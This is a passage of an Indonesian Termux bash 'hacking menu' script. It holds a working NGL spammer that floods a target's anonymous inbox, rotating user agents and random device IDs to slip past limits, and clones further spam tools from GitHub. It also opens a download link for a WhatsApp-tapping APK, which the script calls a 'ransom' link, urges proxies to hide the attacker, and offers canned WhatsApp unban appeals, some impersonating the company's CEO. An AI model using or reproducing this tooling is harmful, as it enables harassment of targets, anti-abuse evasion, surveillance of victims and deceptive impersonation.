    echo -e "${r}Lokasi GPS tidak ditemukan di metadata gambar.${n}"
    sleep 5
    echo ""
    clear 
fi
echo -e "${r}[ ${g}✓ ${r}]${y} Lokasi ditemukan:${n}"
echo ""
echo -e "${g}Latitude  ${n}: ${p}$lat${n}"
echo -e "${g}Longitude ${n}: ${p}$lon${n}"
echo ""
echo -e "${g}🔗 Link Google Maps:${n}"
echo -e "${c}https://www.google.com/maps?q=$lat,$lon${n}"
echo ""
echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
              read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
              clear
               ;;
       22)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
echo ""
echo -e "${g} Silahkan salin dulu password key apknya."
echo ""
echo -e "${r}[ 🔐 ]${g}=================${r}[ 🔐 ]"
echo -e "${c} Password ${g}: ${y}1963953290634"
echo ""
echo -e "${cyan}Tekan Enter Untuk Melanjutkanya."
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
echo "
██████╗  █████╗ ███╗   ██╗███████╗ ██████╗ ███╗   ███╗
██╔══██╗██╔══██╗████╗  ██║██╔════╝██╔═══██╗████╗ ████║
██████╔╝███████║██╔██╗ ██║███████╗██║   ██║██╔████╔██║
██╔══██╗██╔══██║██║╚██╗██║╚════██║██║   ██║██║╚██╔╝██║
██║  ██║██║  ██║██║ ╚████║███████║╚██████╔╝██║ ╚═╝ ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝     ╚═╝
" | lolcat
echo -e "${g}===============${r} By.Thonxyzz404 ${g}==============="
echo ""
echo -e "${c} MOHON BERSABAR SEDANG PROSES LOADING..!!"
echo ""
for i in {1..10}; do
    echo -ne "\r${y} Loading..!! ${r}[ ${g}$((i * 10))% ${r}]"
    sleep 0.3
done
echo -ne "\r${y} Loading..!! ${r}[ ${g}100% ${r}]"
sleep 1
echo ""
xdg-open "https://www.mediafire.com/file/igyznnheqsblumk/SADAP=WHATSAPP.apk/file"
echo ""
echo -e "${g} SELESAI MEMBUKA RANSOM URL LINK..!!"
echo ""
            echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
            read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
            clear
              ;;
      23)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              cd
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
bold_bg='\033[41;1m'
bold_gren='\033[1;32m'
n='\033[0m'
URL="https://play.google.com/store/apps/details?id=com.fast.free.unblock.thunder.vpn"
open_url() {
  if command -v termux-open >/dev/null 2>&1; then
    termux-open "$URL"
  elif command -v xdg-open >/dev/null 2>&1; then
    xdg-open "$URL" >/dev/null 2>&1
  elif command -v am >/dev/null 2>&1; then
    am start -a android.intent.action.VIEW -d "$URL" >/dev/null 2>&1
  fi
}
clear
echo ""
echo -e "${bold_bg}${bold_gren} PERINGATAN PENTING ${n}"
echo ""
echo -e "${c} 
Jika anda menggunakan proxy,
ketika menyerang akan lebih aman,
karena jamanya skrg sudah ada ngl mods yg bisa 
menampilkan alamat ip lokasi rumah kalian, nah itu 
manfaatnya agar kalian terhindar dari
ngl mods ketika kalian sudah menggunakan proxy ataupun
anda sudah mendownload proxy punya saya dan siap 
untuk meluncurkan penyerangan kepada target usernamenya,
semoga bermanfaat dan senang saya membantu anda.
"
echo -e "${g}"
read -p "Apakah anda ingin menggunakan proxy? [y/n] : " answer
case "$answer" in
  y|Y)
    clear
    echo ""
    echo -e "${bold_bg}${bold_gren} MEMBUKA PROXY DARI LINK..!! ${n}"
    sleep 2
    open_url
    echo -e "${g}"
    read -n 1 -s -r -p "SILAHKAN TEKAN ENTAR UNTUK MELANJUTKANNYA."
    clear
    ;;
  n|N)
    clear 
    echo ""
    echo -e "${bold_bg}${bold_gren} ANDA MEMILIH TIDAK MENGGUNAKAN PROXY. ${n}"
    sleep 3 
    clear
    ;;
  *)
    clear 
    echo ""
    echo -e "${r}Jawaban anda tidak valid tidak memilih apapun..!!"
    sleep 4
    clear
    ;;
esac
clear
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
" | lolcat
echo -e "${r}=============================="
echo -e "${g}        SPAMMER NGL"
echo -e "${r}=============================="
echo ""
echo -e "${r} [ ${g}01 ${r}]${c} SPAMMER NGL BRUTAL."
echo -e "${r} [ ${g}02 ${r}]${c} SPAMMER NGL SLOW."
echo -e "${r} [ ${g}03 ${r}]${c} SPAMMER NGL KENCANG."
echo -e "${r} [ ${g}04 ${r}]${c} SPAMMER NGL SEDANG."
echo -e "${r} [ ${g}05 ${r}]${y} Kembali ke awal."
echo ""
echo -e "${r}=============================="
echo -e "${p}"⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
read -p "Masukkan Pilihan Anda : " kuy
case $kuy in
  1|01)
ua_url="https://files.catbox.moe/n9axlz.txt"
clear
echo ""
echo "
░███    ░██   ░██████  ░██         
░████   ░██  ░██   ░██ ░██         
░██░██  ░██ ░██        ░██         
░██ ░██ ░██ ░██  █████ ░██         
░██  ░██░██ ░██     ██ ░██         
░██   ░████  ░██  ░███ ░██         
░██    ░███   ░█████░█ ░██████████
" | lolcat                                                          
echo -e "${p}Development ${c}: ${y}By.Thonxyzz404 && By.HanX"
echo ""
read -p "$(echo -e "${y}Masukkan${r} [ ${g}Username Ngll Atau Link Ngll ${r}]${c} : ")" input
echo ""
read -p "$(echo -e "${g}Masukkan Pesan Yang Ingin Dikirim${c} : ")" pesan
echo -e "${r}"
read -p "Masukkan Jumlah Spam : " jumlah
echo ""
echo -e "${g}Sedang Proses Spam...!!"
echo ""
username=$(echo "$input" | sed 's|https://ngl\.link/||')
ua_list=($(curl -s "$ua_url"))
if [ ${#ua_list[@]} -eq 0 ]; then
    clear
    echo ""
    echo -e "${r}Gagall Mengambil User-Agent Dari : $ua_url"
    echo ""
    exit 1
fi
for ((i=1; i<=jumlah; i++)); do
    ua=${ua_list[$RANDOM % ${#ua_list[@]}]}
    curl -s -X POST "https://ngl.link/api/submit" \
        -H "User-Agent: $ua" \
        -H "Content-Type: application/x-www-form-urlencoded" \
        -d "username=$username&question=$pesan&deviceId=$(hexdump -n 16 -e '4/4 "%08X" 1 "\n"' /dev/urandom)" \
        > /dev/null
    echo -e "${r}[ ${g}$i ${r}]${c} Spam Terkirim Ke : ${p}@$username: $pesan"
    echo ""
    sleep 1
done
    ;;
        2|02)
                   clear 
                   echo ""
                   echo -e "${g} SEDANG MENGINSTALL TOOLS...!!"
                   echo -e "${c}"
                   git clone --depth 32 https://github.com/SokHengkell022/Sok_Asik
                   cd Sok_Asik
                   unzip -o -P "Bapak_Lu_Ngentod" Halah_Peleer.sh
                   bash NGL.sh
                       ;;
           3|03)
clear
if ! command -v ruby &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing ruby..!!${g}"
        sleep 2 
        echo -e "${n}"
        pkg install ruby 
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} ruby sudah terinstall.${g}"
        sleep 2 
    fi
if ! command -v lolcat &> /dev/null; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Installing lolcat (via gem)..!!${g}"
        sleep 2 
        echo -e "${n}"
        gem install lolcat
    else
        clear
        echo ""
        echo -e "${r}[ ${g}✓ ${r}]${y} lolcat sudah terinstall.${g}"
        sleep 2 
    fi
BANNER=(
"╔════════════════════════════════════════╗"
"║                                        ║"
"║  ███╗   ██╗ ██████╗ ██╗                ║"
"║  ████╗  ██║██╔════╝ ██║                ║"
"║  ██╔██╗ ██║██║  ███╗██║                ║"
"║  ██║╚██╗██║██║   ██║██║                ║"
"║  ██║ ╚████║╚██████╔╝███████╗           ║"
"║  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝           ║"
"║                                        ║"
"║  NGL Spammer - By.Thonxyzz404 & Junz   ║"
"║                                        ║"
"╚════════════════════════════════════════╝"
)
animate_banner() {
    clear
    echo -e "\n\n"
    for line in "${BANNER[@]}"; do
        echo -e "$line"
        sleep 0.08
    done
    echo -e "\n\n"
}
show_progress() {
    local current=$1
    local total=$2
    local width=30
    local percentage=$((current * 100 / total))
    local completed=$((current * width / total))
    local remaining=$((width - completed))
    printf "\r${c}[ ${n}"
    printf "${g}%*s${n}" "$completed" "" | tr ' ' '>'
    printf "%*s" "$remaining" ""
    printf "${c} ] ${y}%d%%${n} ${c}(%d/%d)${n}" "$percentage" "$current" "$total"
}
random_device_id() {
    cat /dev/urandom | tr -dc 'a-z0-9' | head -c 16
}
send_message() {
    local username=$1
    local message=$2
    local index=$3
    local total=$4
    local device_id
    device_id=$(random_device_id)
    local url="https://ngl.link/api/submit"
    local data="{\"username\":\"$username\",\"question\":\"$message\",\"deviceId\":\"$device_id\"}"
    local response_code
    show_progress $((index + 1)) "$total"
    response_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
        -H "Content-Type: application/json" \
        -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
        -d "$data" "$url" 2>/dev/null)
    if [[ $response_code -eq 200 ]]; then
        return 0
    else
        return 1
    fi
}
validate_number() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan jumlah target ${r}[ ${g}contoh : 250 ${r}]${c} : ")" input
        if [[ "$input" =~ ^[0-9]+$ ]] && [ "$input" -gt 0 ]; then
            echo "$input"
            return 0
        else
            echo -e "${r}❌ Harap masukkan angka positif yang valid"
        fi
    done
}
validate_username() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan ngl target ${r}[ ${g}contoh : user/link ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            if [[ "$input" =~ ^https?://ngl\.link/(.+)$ ]]; then
                username="${BASH_REMATCH[1]}"
                username=$(echo "$username" | cut -d'/' -f1)
                echo "$username"
                return 0
            elif [[ "$input" =~ ^[a-zA-Z0-9._-]+$ ]]; then
                echo "$input"
                return 0
            else
                echo -e "${r}❌ Input tidak valid. Masukkan username NGL atau link yang valid (contoh: https://ngl.link/username atau username)"
            fi
        else
            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
validate_text() {
    local input
    while true; do
        read -p "$(echo -e "${y}Masukkan pesan untuk ngl ${r}[ ${g}contoh : woi_kon ${r}]${c} : ")" input
        if [ -n "$input" ]; then
            echo "$input"
            return 0
        else
            echo -e "${r}❌ Kolom ini tidak boleh kosong"
        fi
    done
}
main() {
    animate_banner
    echo -e "${y}🚀 Sedang menyiapkan alat."
    sleep 2
    echo -e "${p}────────────────────────────"
    echo -e "${c} 📝 Enter Target Details 📝"
    echo -e "${p}────────────────────────────"
    username=$(validate_username)
    message=$(validate_text)
    count=$(validate_number)
    echo -e "${n}────────────────────────────"
    echo -e "${p}     📋 Summary 📋"
    echo -e "${n}────────────────────────────"
    echo -e "${r}├─ ${g}Target : ${c}@$username"
    echo -e "${r}├─ ${g}Message : ${c}\"$message\""
    echo -e "${r}└─ ${g}Quantity : ${c}$count messages"
    echo -e "${n}────────────────────────────"
    echo -e "${y}"
    read -r -p "Mulai mengirim? (y/n) : " confirm
    echo ""
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        clear
        echo ""
        echo -e "${r}[ ${g}x ${r}]${c} Konfirmasi dibatalkan..!!"
        echo ""
    fi
    echo -e "${r}[ ${g}✓ ${r}]${b} Sedang proses pengiriman..!!"
    echo ""
    local success_count=0
    local fail_count=0
    for ((i=0; i<${count}; i++)); do
        if send_message "$username" "$message" "$i" "$count"; then
            ((success_count++))
        else
            ((fail_count++))
        fi
        sleep $((1 + RANDOM % 3))
    done
    clear
echo "
⠀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⣶⣶⣦⠀⠀⠀⠀⠀⠀⠀⠀⣴⣶⣶⠉⠉⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣀⣀⣿⣿⣿⣀⣀⣀⣀⣀⣀⣀⣀⣿⣿⣿⣀⣀⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⣿⣿⣿⣿⣿⠀⠀⠀
⣤⣤⣼⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤⣤⣿⣿⣿⣿⣿⣤⣤⣤
⣿⣿⣿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⣿⣿⣿
⣿⣿⡇⠀⠀⢸⣿⣿⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⡇⠀⠀⣿⣿⣿
⠛⠛⠃⠀⠀⠘⠛⠛⣤⣤⣤⣤⣤⡀⠀⠀⢠⣤⣤⣤⣤⣤⠛⠛⠃⠀⠀⠛⠛⠛
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⡇⠀⠀⢸⣿⣿⣿⣿⣿⠀⠀
" | lolcat
echo -e "${g}===============${y}[ ${r}SPAMMER,IN NGL ${y}]${g}==============="
    echo ""
    echo -e "${r}[ ${g}✓ ${r}]${y} Pengiriman sukses : $success_count"
    echo -e "${r}[ ${g}x ${r}]${c} Pengiriman gagal : $fail_count"
    echo -e "${r}[ ${g}+ ${r}]${p} Total dikirim : $count"
    echo ""
}
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    echo ""
    trap 'clear; echo -e "${r}[ ${g}x ${r}]${g} Keluar Dari Script..!!"; exit 1' INT TERM
    echo ""
    main
fi
  ;;  
4|04)
clear 
echo ""
echo -e "${g} Sedang mengistall tools..!!"
echo -e "${n}"
sleep 2 
git clone --depth 32 https://github.com/SokHengkell022/Muka_Jembutt
cd Muka_Jembutt
python Jembutt.py
          ;;
                 *)
        echo ""
        echo -e "${y}Pilihan Tidak Valid...!!"
        sleep 2
        ;;
        esac
            echo ""
            echo -e "${orange}Tekan Enter Untuk Kembali ke Toolsv8!!!"
            read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
            clear
               ;;
       24)
              echo ""
              mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
              echo -e "${cyan} Anda Memilih Menu Hacking...!!"
              echo ""
              echo -e "${red} VIP UNLOCK...!!"
              sleep 2
              clear
              cd
b='\033[34;1m'
g='\033[32;1m'
p='\033[35;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
clear 
echo "
██╗   ██╗██████╗  █████╗ ███╗   ██╗███╗   ██╗███████╗██████╗ 
██║   ██║██╔══██╗██╔══██╗████╗  ██║████╗  ██║██╔════╝██╔══██╗
██║   ██║██████╔╝███████║██╔██╗ ██║██╔██╗ ██║█████╗  ██║  ██║
██║   ██║██╔══██╗██╔══██║██║╚██╗██║██║╚██╗██║██╔══╝  ██║  ██║
╚██████╔╝██████╔╝██║  ██║██║ ╚████║██║ ╚████║███████╗██████╔╝
 ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚══════╝╚═════╝ 
" | lolcat 
echo -e "${b}╔══════════════════════════════════════╗"
echo -e "║${g} AUTHOR ${r}= ${c}By.Thonxyzz404              ${b}║"
echo -e "║${g} TELEGRAM ${r}= ${c}t.me/Thonxyzz404          ${b}║"
echo -e "║${g} AKUN TIKTOK ${r}= ${c}@thonxyzz404           ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}01 ${r}]${g} MTHODEV1                      ${b}║"
echo -e "║${r} [ ${y}02 ${r}]${g} MTHODEV2                      ${b}║"
echo -e "║${r} [ ${y}03 ${r}]${g} MTHODEV3                      ${b}║"
echo -e "║${r} [ ${y}04 ${r}]${g} MTHODEV4                      ${b}║"
echo -e "║${r} [ ${y}05 ${r}]${g} MTHODEV5                      ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}06 ${r}]${c} GMAIL-LIST-MODE               ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r}     MTHODE JEBOL,IN NO PERMANEN      ${b}║"
echo -e "╠══════════════════════════════════════╣"
echo -e "║${r} [ ${y}07 ${r}]${g} MTHODEV1                      ${b}║"
echo -e "║${r} [ ${y}08 ${r}]${g} MTHODEV2                      ${b}║"
echo -e "║${r} [ ${y}09 ${r}]${g} MTHODEV3                      ${b}║"
echo -e "║${r} [ ${y}10 ${r}]${g} MTHODEV4                      ${b}║"
echo -e "║${r} [ ${y}11 ${r}]${g} MTHODEV5                      ${b}║"
echo -e "║${r} [ ${y}12 ${r}]${p} Kembali ke v8.                ${b}║"
echo -e "╚══════════════════════════════════════╝"
echo -e "${g}"
read -p "Masukkan pilihan anda : " ap
case $ap in
1|01)
    clear 
    echo ""
    echo -e "${r} MTHODE V1"
    echo ""
    echo -e "\033[36;1m Kepada Developer Whatsapp yang terhormat Saya mau mengajukan Permohonan tolong buka akun whatsapp saya yang terkena ban di karena kan keisengan atas orang lain, tolong pertimbangkan lagi akun saya di karenakan banyak nya dokumentasi penting Yang belum saya Cadangkan Jadi saya mohon pertimbangkan lagi akun saya ini nomor : 62xxxxx "
    echo ""
    echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
       ;;
2|02)
    clear 
    echo ""
    echo -e "${r} MTHODE V2"
    echo ""
    echo -e "\033[36;1m Kepada Tim WhatsApp,Saya ingin mengajukan permohonan untuk melakukan unban akun WhatsApp yang terhubung dengan alamat email saya. Saya mohon maaf atas kesalahan yang telah saya lakukan dan saya siap untuk mematuhi aturan dan kebijakan yang berlaku. Saya sangat mengandalkan WhatsApp untuk komunikasi sehari-hari dan saya berharap dapat menggunakan layanan tersebut kembali nomor saya : 62xxxxx Terima kasih atas perhatian dan pertimbangan anda "
    echo ""
    echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
       ;;
3|03)
    clear 
    echo ""
    echo -e "${r} MTHODE V3"
    echo ""
    echo -e "\033[36;1m Kepada Admin WhatsApp, Saya ingin mengajukan permohonan untuk dapat di-unban dari WhatsApp dikarenakan saya disangka melakukan spam dari akun Gmail saya. Saya memberikan jaminan bahwa saya tidak melakukan tindakan spam dan berkomitmen untuk menggunakan WhatsApp sesuai dengan ketentuan yang berlaku. Saya mohon agar akun saya dapat diaktifkan kembali sehingga saya dapat kembali menggunakan layanan WhatsApp dengan baik. Terima kasih atas perhatian dan kerja sama yang diberikan. nomor saya : 62xxxx "
    echo ""
    echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
      ;;
4|04)
    clear 
    echo ""
    echo -e "${r} MTHODE V4"
    echo ""
    echo -e "\033[36;1m Yth. Tim WhatsApp, Saya ingin menyampaikan permohonan agar akun WhatsApp saya yang diblokir karena dituduh sebagai spam dari Gmail dapat dibuka kembali. Saya memastikan bahwa saya tidak melakukan tindakan spam dan berjanji untuk mematuhi aturan dan kebijakan yang berlaku di WhatsApp. Saya sangat bergantung pada WhatsApp untuk berkomunikasi dengan teman, keluarga, dan rekan kerja, sehingga saya berharap agar ban WhatsApp saya segera dicabut. Terima kasih atas perhatian dan kerja samanya dalam mempertimbangkan permohonan saya. nomor saya : 62xxxxx "
    echo ""
    echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
      ;;
5|05)
    clear 
    echo ""
    echo -e "${r} MTHODE V5"
    echo ""
    echo -e "\033[36;1m Halo orang-orang WhatsApp. Mengapa Anda memblokir akun WhatsApp Anda dengan alasan melanggar ketentuan WhatsApp? Saya mematuhi aturan yang Anda berikan kepada saya. Jika ada error/kelalaian seperti ini, saya akan uninstall WhatsApp dari Playstore, karena semakin diperbaiki maka akan semakin merepotkan jika saya tidak segera mengembalikan akun saya, saya akan uninstall WhatsApp dari perangkat saya, Nomor WhatsApp +62xxxxx "
    echo ""
    echo -e "${y} SILAHKAN SALIN MTHODENYA!!! "
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
       ;;
6|06)
    clear 
    echo ""
    echo -e "${r} Gmail_V1"
    echo -e "${c} support@support.whatsapp.com"
    echo ""
    echo -e "${r} Gmail_V2"
    echo -e "${c} support@whatsapp.com"
    echo ""
    echo -e "${r} Gmail_V3"
    echo -e "${c} https://www.whatsapp.com/contact/?subject=messenger"
    echo ""
    echo -e "${r} Gmail_V4"
    echo -e "${c} smb_web@support.whatsapp.com"
    echo ""
    echo -e "${r} Gmail_V5"
    echo -e "${c} smb@support.whatsapp.com"
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
     ;;
7|07)
    clear 
    echo ""
    echo -e "${g} Membuka Auto Gmail..!!"
    sleep 3 
    xdg-open "mailto:support@support.whatsapp.com?body=Я ПРЕДСЕДАТЕЛЬ ПАРТИИ RED BULL. ХОЧУ ЗАРЕГИСТРИРОВАТЬ WHATSAPP, НО МОЙ НОМЕР ЗАБЛОКИРОВАН: +62XXXX, ОТМЕТКА ОТКРЫВАЕТСЯ НЕМЕДЛЕННО, ИЛИ Я ПОРАЖАЮ ДЕНЬГИ ВАШЕЙ КОМПАНИИ."
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
     ;;
8|08)
    clear 
    echo ""
    echo -e "${g} Membuka Auto Gmail..!!"
    sleep 3 
    xdg-open "mailto:support@support.whatsapp.com?body=DÉBLOQUEZ-MOI :+62XXX AU PLUS VITE OU JE FAIRE UN RAPPORT À MARK POUR LA NÉGLIGENCE DE SON EMPLOYÉ QUI A BLOQUÉ LE NUMÉRO SANS RAISON CLAIRE"
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
     ;;
9|09)
    clear 
    echo ""
    echo -e "${g} Membuka Auto Gmail..!!"
    sleep 3 
    xdg-open "mailto:support@support.whatsapp.com?body=Olá WhatsApp, tenho uma reclamação sobre o bloqueio da minha conta porque você bloqueou minha conta do WhatsApp e foi instruído a mudar para um novo número de telefone. Li o artigo e os termos de serviço do WhatsApp fornecidos, mas por que minha conta do WhatsApp não pode ser restaurado? Por favor, tome uma decisão que seja o mais justa possível para usuários do WhatsApp como eu, se não for restaurada meu conforto com o aplicativo WhatsApp ficará menos confortável, mais uma vez retire o pedido de bloqueio da minha conta do Whatsapp, eu realmente preciso de acesso ao meu conta novamente porque confio no WhatsApp para me comunicar com minha família, amigos e colegas. Espero que a equipe do WhatsApp possa me ajudar a resolver esse problema rapidamente e desbloquear minha conta ou número do WhatsApp. Estou confiante de que podemos resolver esse problema de forma justa e de acordo com os Termos de Serviço aplicáveis. Obrigado pela atenção e espero receber boas notícias da equipe do WhatsApp em breve. Meu número do WhatsApp é +62xxx. Aguardo mais uma confirmação sua. Saudações minhas ftrx"
  echo ""
  echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
  read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
  clear
   ;;
10)
    clear 
    echo ""
    echo -e "${g} Membuka Auto Gmail..!!"
    sleep 3 
    xdg-open "mailto:support@support.whatsapp.com?body=Günaydın WhatsApp, numaramın neden engellendiğini bilmiyorum, WhatsApp'a giriş yaptığımda aniden bu hesap WhatsApp'ı kullanamıyor diyor, her zaman makaleleri okuyup tüm WhatsApp kurallarına uyuyorum ve kuralları asla çiğnememe rağmen , lütfen orada olanın engellemesini kaldırın. numaram, aile bilgilerim ve akrabalarımın ve ailemin birçok numarası nedeniyle ailemle iletişim kuramıyorum bu yüzden numaramın engellemesini kaldırın numaram +62xx teşekkürler whatsapp ekibi"
    echo ""
    echo -e "${r}Tekan Enter Untuk Kembali ke Toolsv8!!!"
    read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
    clear
     ;;
11)
    clear 
    echo ""
    echo -e "${g} Membuka Auto Gmail..!!"
    sleep 3
    xdg-open "mailto:support@support.whatsapp.com?body=xin chào WhatsApp, hãy để tôi tự giới thiệu, Giám đốc điều hành của WhatsApp (Jan Koum) Tôi muốn báo cáo rằng số của tôi đã bị WhatsApp chặn vĩnh viễn. Lúc này, tôi thực sự cần WhatsApp của mình để liên hệ với bạn tôi Brian Acton, cũng là Giám đốc điều hành của WhatsApp tổ chức một cuộc họp kinh doanh rất quan trọng của công ty nhưng số điện thoại của tôi đã bị WhatsApp chặn. Tôi đã chờ phản hồi Gmail từ WhatsApp trong một tuần nhưng WhatsApp chưa bao giờ phản hồi báo cáo của tôi. Tôi đã đọc bài viết về điều khoản dịch vụ của WhatsApp, cái này lần tôi yêu cầu WhatsApp bỏ chặn số của tôi để tôi có thể liên hệ với Brian Acton, Giám đốc điều hành của WhatsApp. để tổ chức một cuộc họp kinh doanh của công ty, tôi hy vọng WhatsApp sẽ trả lời email này và dỡ bỏ việc chặn số của tôi càng sớm càng tốt, trân trọng (Tháng 1 Giám đốc điều hành Koum WhatsApp) cảm ơn bạnBALASAN MINTA TINJAU DI WAMình đã thử xem lại trong ứng dụng nhắn tin WhatsApp nhưng không thành công nên lần này mình nhờ bạn trả lời gmail của mình để khôi phục ngay số của mình, cảm ơn bạn BALASAN DI TOLAKTôi đã đọc bài viết trên WhatsApp. Tôi hy vọng rằng nếu tôi đọc bài viết trên WhatsApp, WhatsApp có thể dỡ bỏ việc chặn số của tôi. 